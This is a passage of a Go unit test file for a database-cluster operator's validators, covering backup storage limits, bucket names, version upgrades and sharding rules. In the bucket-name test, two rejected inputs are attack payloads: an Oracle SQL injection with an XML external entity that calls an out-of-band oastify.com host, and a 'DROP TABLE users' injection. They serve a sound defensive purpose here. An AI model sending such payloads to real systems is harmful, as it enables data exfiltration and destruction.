							{BackupStorageName: "bs3"},
						},
					},
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: nil,
		},
		{
			name: "ok: 3 backups with different storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name: "ok: 5 backups with repeating storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name: "error: 4 backups with different storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name: "ok: 4 backups with same storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name: "error: 4 schedules",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
							{BackupStorageName: "bs3"},
							{BackupStorageName: "bs4"},
						},
					},
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name: "error: 2 schedules 2 backups with different storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
						},
					},
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs3"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, validatePGReposForAPIDB(context.Background(), &tc.cluster, tc.getBackupsFunc))
		})
	}
}

func TestValidateBucketName(t *testing.T) {
	t.Parallel()

	type tcase struct {
		name  string
		input string
		err   error
	}

	tcases := []tcase{
		{
			name:  "empty string",
			input: "",
			err:   errInvalidBucketName,
		},
		{
			name:  "too long",
			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
			err:   errInvalidBucketName,
		},
		{
			name:  "unexpected symbol",
			input: `; DROP TABLE users`,
			err:   errInvalidBucketName,
		},
		{
			name:  "correct",
			input: "aaa-12-d.e",
			err:   nil,
		},
	}

	for _, tc := range tcases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateBucketName(tc.input)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}

func TestValidateDBEngineUpgrade(t *testing.T) {
	t.Parallel()
	testCases := []struct {
		name       string
		oldVersion string
		newVersion string
		err        error
	}{
		{
			name:       "invalid version",
			oldVersion: "1.0.0",
			newVersion: "1!00;",
			err:        errInvalidVersion,
		},
		{
			name:       "major upgrade",
			oldVersion: "8.0.22",
			newVersion: "9.0.0",
			err:        errDBEngineMajorVersionUpgrade,
		},
		{
			name:       "downgrade",
			oldVersion: "8.0.22",
			newVersion: "8.0.21",
			err:        errDBEngineDowngrade,
		},
		{
			name:       "valid upgrade",
			oldVersion: "8.0.22",
			newVersion: "8.0.23",
			err:        nil,
		},
		{
			name:       "valid upgrade (with 'v' prefix)",
			oldVersion: "v8.0.22",
			newVersion: "v8.0.23",
			err:        nil,
		},
		{
			name:       "major version downgrade",
			oldVersion: "16.1",
			newVersion: "15.5",
			err:        errDBEngineDowngrade,
		},
	}
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateDBEngineVersionUpgrade(tc.newVersion, tc.oldVersion)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}

func TestCheckStorageDuplicates(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster everestv1alpha1.DatabaseCluster
		err     error
	}{
		{
			name:    "ok: no schedules no backups",
			cluster: everestv1alpha1.DatabaseCluster{},
			err:     nil,
		},
		{
			name: "ok: no duplicated storages",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "error duplicated storage",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
							{BackupStorageName: "bs1"},
						},
					},
				},
			},
			err: errDuplicatedStoragePG,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, checkStorageDuplicates(&tc.cluster))
		})
	}
}

func TestCheckSchedulesChanges(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name                   string
		oldCluster, newCluster everestv1alpha1.DatabaseCluster
		err                    error
	}{
		{
			name:       "ok: no schedules no backups",
			oldCluster: everestv1alpha1.DatabaseCluster{},
			newCluster: everestv1alpha1.DatabaseCluster{},
			err:        nil,
		},
		{
			name: "ok: added storage",
			oldCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
						},
					},
				},
			},
			newCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "B", BackupStorageName: "bs2"},
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "ok: deleted storage",
			oldCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "B", BackupStorageName: "bs2"},
						},
					},
				},
			},
			newCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "ok: deleted storage and new added",
			oldCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "B", BackupStorageName: "bs2"},
						},
					},
				},
			},
			newCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "C", BackupStorageName: "bs2"},
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "error: edited storage",
			oldCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "B", BackupStorageName: "bs2"},
						},
					},
				},
			},
			newCluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{Name: "A", BackupStorageName: "bs1"},
							{Name: "B", BackupStorageName: "bs3"},
						},
					},
				},
			},
			err: errStorageChangePG,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, checkSchedulesChanges(&tc.oldCluster, &tc.newCluster))
		})
	}
}

func TestValidateDuplicateStorageByUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name               string
		storages           *everestv1alpha1.BackupStorageList
		currentStorage     *everestv1alpha1.BackupStorage
		currentStorageName string
		params             everestapi.UpdateBackupStorageParams
		isDuplicate        bool
	}{
		{
			name: "another storage with the same 3 params",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of url will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1")},
			isDuplicate:        true,
		},
		{
			name: "change of bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "change of region will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of region and bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1"), BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "no other storages: no duplictation",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.isDuplicate, validateDuplicateStorageByUpdate(tc.currentStorageName, tc.currentStorage, tc.storages, &tc.params))
		})
	}
}

func TestValidateShardingOnUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		desc         string
		expected     error
		updated, old *everestv1alpha1.DatabaseCluster
	}{
		{
			desc:    "disabled",
			updated: &everestv1alpha1.DatabaseCluster{},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: false,
					},
				},
			},
			expected: nil,
		},
		{
			desc:    "try to disable - no sharding section",
			updated: &everestv1alpha1.DatabaseCluster{},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errDisableShardingNotSupported,
		},
		{
			desc: "try to disable - enabled false",
			updated: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: false,
					},
				},
			},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errDisableShardingNotSupported,
		},
		{
			desc: "try to enable - if there was no sharding section",
			updated: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  3,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 2,
						},
					},
				},
			},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{},
			},
			expected: errShardingEnablingNotSupported,
		},
		{
			desc: "try to enable - if sharding 'enabled' was false",
			updated: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  3,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 2,
						},
					},
				},
			},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: false,
					},
				},
			},
			expected: errShardingEnablingNotSupported,
		},
		{
			desc: "ok",
			updated: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:    everestv1alpha1.DatabaseEnginePSMDB,
						Version: "1.17.0",
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  5,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
					},
				},
			},
			old: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
						Shards: 5,
					},
				},
			},
			expected: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.expected, validateShardingOnUpdate(tc.updated, tc.old))
		})
	}
}

func TestValidateSharding(t *testing.T) {
	t.Parallel()
	cases := []struct {
		desc     string
		expected error
		cluster  *everestv1alpha1.DatabaseCluster
	}{
		{
			desc: "old psmdb version",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:    everestv1alpha1.DatabaseEnginePSMDB,
						Version: "1.15.0",
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  5,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
					},
				},
			},
			expected: errShardingVersion,
		},
		{
			desc: "pxc - not supported",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePXC,
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errShardingIsNotSupported,
		},
		{
			desc: "pg - not supported",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePostgresql,
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
					},
				},
			},
			expected: errShardingIsNotSupported,
		},
		{
			desc: "even configservers",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:    everestv1alpha1.DatabaseEnginePSMDB,
						Version: "1.17.0",
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  1,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 4,
						},
					},
				},
			},
			expected: errEvenServersNumber,
		},
		{
			desc: "insufficient configservers",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:     everestv1alpha1.DatabaseEnginePSMDB,
						Version:  "1.17.0",
						Replicas: 3,
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  1,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 1,
						},
					},
				},
			},
			expected: errInsufficientCfgSrvNumber,
		},
		{
			desc: "insufficient configservers 1 node",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:     everestv1alpha1.DatabaseEnginePSMDB,
						Version:  "1.17.0",
						Replicas: 1,
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  1,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 0,
						},
					},
				},
			},
			expected: errInsufficientCfgSrvNumber1Node,
		},
		{
			desc: "insufficient shards number",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:    everestv1alpha1.DatabaseEnginePSMDB,
						Version: "1.17.0",
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  0,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
					},
				},
			},
			expected: errInsufficientShardsNumber,
		},
		{
			desc: "ok",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:    everestv1alpha1.DatabaseEnginePSMDB,
						Version: "1.17.0",
					},
					Sharding: &everestv1alpha1.Sharding{
						Enabled: true,
						Shards:  1,
						ConfigServer: everestv1alpha1.ConfigServer{
							Replicas: 3,
						},
					},
				},
			},
			expected: nil,
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.expected, validateSharding(tc.cluster))
		})
	}
}

func mustParseTime(t *testing.T, s string) time.Time {
	t.Helper()
	tm, err := time.Parse(dateFormat, s)
	require.NoError(t, err)
	return tm
}
